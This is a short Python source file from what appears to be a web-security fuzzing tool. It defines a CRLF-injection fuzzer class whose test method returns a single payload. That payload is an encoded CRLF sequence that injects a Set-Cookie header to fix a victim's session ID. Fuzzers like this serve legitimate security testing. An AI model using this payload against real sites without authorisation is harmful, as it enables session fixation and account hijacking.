#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer


class CRLFInjection(Fuzzer):

    """CRLFInjection"""

    def __init__(self):
        super(CRLFInjection, self).__init__()

    @staticmethod
    def test(self):
        return ["%0d%0aSet-Cookie:%20SESSIONID=SessionFixed%0d%0a"]
